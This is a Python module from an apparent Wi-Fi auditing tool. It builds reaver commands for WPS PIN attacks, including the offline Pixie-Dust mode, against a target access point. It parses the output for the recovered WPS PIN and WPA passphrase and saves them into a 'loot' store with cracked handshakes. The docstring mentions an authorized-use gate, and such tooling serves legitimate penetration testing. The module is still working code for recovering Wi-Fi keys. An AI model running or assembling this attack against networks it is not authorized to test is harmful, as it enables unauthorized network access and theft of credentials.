"""WPS PIN attacks (reaver + pixiewps): command building, output parsing, and
writing a recovered key into the crack loot store.

A whole attack class separate from handshake capture: WPS-enabled APs can leak
the WPA PSK via a weak/registrar-PIN flow (notably the offline **Pixie-Dust**
attack). This module is the pure, testable part — the ``kestrel wps`` CLI drives
the radio (it transmits, so it is gated by the authorized-use acknowledgment and
pauses capture while it runs). Stdlib only; recovered keys land in the same loot
store as cracked handshakes, so ``/loot`` shows them together.
"""
from __future__ import annotations

import re
import time

from . import device_id
from .crack import CRACK_DIR
from .crack.store import LootStore

REAVER = "reaver"


def build_reaver_cmd(iface, bssid, channel=None, pixie=True, extra=()):
    """argv for a reaver run against ``bssid`` on ``iface`` (a monitor interface).
    ``pixie`` adds ``-K 1`` (Pixie-Dust: offline, fast when the AP is vulnerable);
    without it reaver falls back to the online PIN flow. ``-vv`` so the PIN/PSK
    lines are printed for :func:`parse_reaver_output`."""
    cmd = [REAVER, "-i", str(iface), "-b", str(bssid), "-vv"]
    if channel:
        cmd += ["-c", str(channel)]
    if pixie:
        cmd += ["-K", "1"]
    cmd += [str(x) for x in (extra or ())]
    return cmd


_PIN_RE = re.compile(r"WPS PIN:\s*'?(\d{4,})'?")
_PSK_RE = re.compile(r"WPA PSK:\s*'([^']*)'")
_SSID_RE = re.compile(r"(?:AP SSID|SSID):\s*'([^']*)'")


def parse_reaver_output(text):
    """Extract ``{pin, psk, essid}`` from reaver ``-vv`` output. Keys are absent
    when not found (a run that didn't recover anything returns ``{}``). An empty
    PSK string ``''`` (an open/leaked-empty result) still counts as present."""
    out = {}
    text = text or ""
    m = _PIN_RE.search(text)
    if m:
        out["pin"] = m.group(1)
    m = _PSK_RE.search(text)
    if m:
        out["psk"] = m.group(1)
    m = _SSID_RE.search(text)
    if m:
        out["essid"] = m.group(1)
    return out


def record_to_loot(bssid, essid, psk, pin="", crack_dir=CRACK_DIR, now=None):
    """Write a WPS-recovered PSK into the crack loot store (so it shows on the
    ``/loot`` page beside cracked handshakes). Keyed by BSSID like any loot;
    returns False when the BSSID is unusable."""
    now = time.time() if now is None else now
    store = LootStore(crack_dir)
    aps = store.load()
    rec = LootStore.upsert(aps, {"bssid": bssid, "essid": essid or "",
                                 "type": "wps", "hashlines": 0, "files": []},
                           now=now)
    if rec is None:
        return False
    LootStore.mark_cracked(rec, psk, "WPS (pin %s)" % pin if pin else "WPS",
                           now=now)
    rec["source"] = "wps"
    rec["wps_pin"] = pin or ""
    rec["device"] = device_id.label(bssid=bssid, essid=essid or "")
    store.save(aps)
    return True
